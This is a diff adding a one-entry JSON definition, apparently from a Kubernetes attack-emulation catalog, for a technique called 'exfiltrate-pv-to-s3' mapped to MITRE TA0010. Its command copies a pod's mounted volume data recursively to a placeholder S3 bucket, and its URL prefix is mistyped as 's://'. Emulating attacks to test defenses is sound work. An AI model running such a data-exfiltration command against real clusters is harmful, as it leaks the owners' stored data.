@@ -1,0 +1,13 @@
+[
+    {
+    "id": "rk-ex01",
+    "name": "exfiltrate-pv-to-s3",
+    "description": "exfiltrate mounted pv to s3 bucket",
+    "tactic_id": "TA0010",
+    "mitre_ref": "https://attack.mitre.org/tactics/TA0010/",
+    "mode": "active",
+    "args": "True",
+    "command": "kubectl exec $POD_NAME -n $NAMESPACE -- aws s3 cp data s://<Bucket_Name> --recursive",
+    "leading_to": ""
+    }
+]
